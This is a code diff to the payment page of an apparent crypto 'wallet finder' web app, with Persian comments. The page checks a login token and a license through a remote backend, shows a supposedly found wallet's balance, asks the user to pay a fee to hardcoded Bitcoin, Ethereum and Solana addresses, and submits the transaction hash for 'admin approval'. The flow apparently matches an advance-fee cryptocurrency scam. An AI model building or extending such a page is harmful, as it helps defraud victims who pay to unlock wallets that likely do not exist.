@@ -26,9 +26,7 @@
       max-width: 600px;
       width: 100%;
     }
-    h1 {
-      margin-bottom: 20px;
-    }
+    h1 { margin-bottom: 20px; }
     .wallet-address {
       font-family: monospace;
       background: #000;
@@ -76,6 +74,15 @@
   </div>
 
   <script>
+    const API_BASE_URL = "https://dolphinwalletfinderbackend-production.up.railway.app/api";
+    const token = sessionStorage.getItem("token") || localStorage.getItem("token");
+
+    if (!token) {
+      alert("Please log in first.");
+      window.location.href = "login.html";
+    }
+
+    // آدرس‌های پرداخت برای هر شبکه
     const networkAddresses = {
       "Bitcoin": "bc1qdw8agqhz08hgzlg0vqpx25rxy4qxpwsa68d5ua",
       "Ethereum": "0xacDd54d29d350f183bE47Ec64C95Bfc05805c902",
@@ -85,14 +92,55 @@
       "Solana": "D5RrUjhS2519gj77B7Ead4BB83Ew6bGmcUVX62qq5h2t"
     };
 
-    const wallet = JSON.parse(localStorage.getItem("found_wallet") || "{}");
-    const currency = wallet.balance?.split(" ")[1] || "USDT";
-    const amount = parseFloat(wallet.balance?.split(" ")[0]) || 0;
-    const fee = (amount * 0.001).toFixed(6);
-    const network = wallet.network || "Ethereum";
+    // چک لایسنس قبل از ادامه
+    fetch(`${API_BASE_URL}/license/status`, {
+      headers: { "Authorization": "Bearer " + token }
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.license !== "active") {
+        alert("🚫 You must be approved by admin before continuing.");
+        window.location.href = "license.html";
+      } else {
+        loadWalletAndFee();
+      }
+    })
+    .catch(() => {
+      alert("Server error");
+      window.location.href = "license.html";
+    });
 
-    document.getElementById("feeText").innerHTML = `Please send <strong>${fee} ${currency}</strong> to the wallet below:`;
-    document.getElementById("dynamicWallet").innerText = networkAddresses[network] || "No address for this network.";
+    // لود ولت و محاسبه فی
+    function loadWalletAndFee() {
+      fetch(`${API_BASE_URL}/my-wallet`, {
+        headers: { "Authorization": "Bearer " + token }
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (!data.wallet) {
+          alert("❌ No wallet found.");
+          window.location.href = "scan.html";
+          return;
+        }
+
+        const wallet = data.wallet;
+        const [amountStr, currency] = wallet.balance.split(" ");
+        const amount = parseFloat(amountStr);
+
+        // محاسبه 0.005% کارمزد
+        const fee = (amount * 0.00005).toFixed(8);
+
+        document.getElementById("feeText").innerHTML =
+          `Please send <strong>${fee} ${currency}</strong> to the wallet below:`;
+
+        // آدرس پرداخت بر اساس شبکه
+        const payAddress = networkAddresses[wallet.network] || "No address for this network.";
+        document.getElementById("dynamicWallet").innerText = payAddress;
+      })
+      .catch(() => {
+        alert("Error loading wallet data.");
+      });
+    }
 
     function copyWallet() {
       const addr = document.getElementById("dynamicWallet").innerText;
@@ -100,34 +148,35 @@
       alert("Wallet address copied!");
     }
 
+    // ارسال هش تراکنش به سرور
     function submitFinal() {
       const hash = document.getElementById("txFinalHash").value.trim();
       if (!hash) {
         alert("Please enter transaction hash.");
         return;
       }
-      localStorage.setItem("final_tx", hash);
-      localStorage.setItem("final_tx_status", "pending");
-      window.location.href = "success.html";
+
+      fetch(`${API_BASE_URL}/license/request`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer " + token
+        },
+        body: JSON.stringify({ tx_hash: hash })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.success) {
+          alert("✅ Transaction hash submitted successfully! Waiting for admin approval.");
+          window.location.href = "success.html";
+        } else {
+          alert("❌ " + (data.error || "Failed to submit transaction hash."));
+        }
+      })
+      .catch(() => {
+        alert("Server error occurred.");
+      });
     }
   </script>
-
-<script>
-  const username = localStorage.getItem("username");
-
-  fetch(`https://dolphinwalletfinderbackend-production.up.railway.app/api/status/${username}`)
-    .then(res => res.json())
-    .then(data => {
-      if (data.status !== "approved") {
-        alert("🚫 You must be approved by admin before continuing.");
-        window.location.href = "license.html";
-      }
-    })
-    .catch(() => {
-      alert("Server error");
-      window.location.href = "license.html";
-    });
-</script>
-
 </body>
 </html>
